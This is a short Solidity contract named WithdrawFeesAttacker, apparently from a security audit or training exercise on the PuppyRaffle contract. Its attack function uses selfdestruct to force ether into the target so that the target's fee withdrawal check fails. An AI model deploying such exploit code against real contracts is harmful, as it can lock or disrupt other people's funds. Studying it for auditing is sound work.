//SPDX-License-Identifier: MIT;

pragma solidity ^0.7.6;

import {PuppyRaffle} from "../../src/PuppyRaffle.sol";


contract WithdrawFeesAttacker {
    PuppyRaffle target;


    constructor(address _target) payable {
        target = PuppyRaffle(_target);
    }

    function attack() public {
        selfdestruct(payable(address(target)));
    }
}